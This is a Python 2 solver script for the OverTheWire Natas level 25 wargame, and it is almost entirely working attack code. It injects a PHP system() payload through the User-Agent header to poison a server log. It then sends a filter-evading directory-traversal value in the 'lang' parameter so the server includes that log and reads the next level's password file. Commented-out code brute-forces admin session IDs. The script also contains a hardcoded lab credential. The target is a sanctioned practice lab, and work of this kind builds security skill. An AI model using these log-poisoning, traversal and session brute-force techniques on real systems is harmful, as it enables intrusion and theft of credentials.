#!/usr/bin/env python

import requests
import re
import urllib
import base64
from string import *
from time import *

characters = lowercase + uppercase + digits
#print characters

username = 'natas25'
password = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'

#headers = { "Referer" : "http://natas5.natas.labs.overthewire.org/"}

#cookies = { "loggedin" : "1"}

url = 'http://%s.natas.labs.overthewire.org/' %username

session = requests.Session()

response = session.get (url, auth = (username, password))

headers = {"User-Agent": "<?php system('cat /etc/natas_webpass/natas26'); ?>"}
#print session.cookies['PHPSESSID']

response = session.post(url, headers = headers, data = {"lang" : "..././..././..././..././..././var/www/natas/natas25/logs/natas25_" + session.cookies['PHPSESSID'] + ".log"}, auth = (username, password) )
print response.text
#print session.cookies["PHPSESSID"]



#for session_id in range (1,641):
#
##response = session.post(url, data = {"username" : "natas20", "password": "blah"}, auth = (username, password))
	#print {"PHPSESSID": str("%d-admin" %session_id).encode("hex")}
	#response = session.get(url, cookies = {"PHPSESSID": str("%d-admin" %session_id).encode("hex")}, auth = (username, password) )
	#content = response.text
##
	#if ( "You are an admin" in content ):
		#print "Got it!", session_id
		##print content
		#break
	
		#print "trying", session_id
	#rint content	
	#print session.cookies["PHPSESSID"].decode('hex')
#print "======================================================="
#print content
